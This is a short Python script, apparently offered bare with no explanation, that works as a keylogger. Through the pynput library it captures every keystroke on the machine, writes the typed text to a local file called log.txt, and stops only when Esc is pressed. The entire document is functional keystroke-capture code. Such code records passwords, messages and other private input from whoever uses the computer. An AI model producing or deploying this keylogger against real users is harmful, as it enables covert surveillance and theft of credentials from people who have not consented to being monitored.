from pynput import keyboard
from datetime import datetime

log_file = "log.txt"

def format_key(key):
    key = str(key).replace("'", "")

    if key == "Key.space":
        return " "
    elif key == "Key.enter":
        return "\n"
    elif key == "Key.tab":
        return "\t"
    elif key == "Key.backspace":
        return ""
    elif key == "Key.esc":
        return False
    elif "Key" in key:
        return ""
    else:
        return key

def on_press(key):
    formatted = format_key(key)

    if formatted == False:
        return False

    with open(log_file, "a") as f:
        f.write(formatted)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()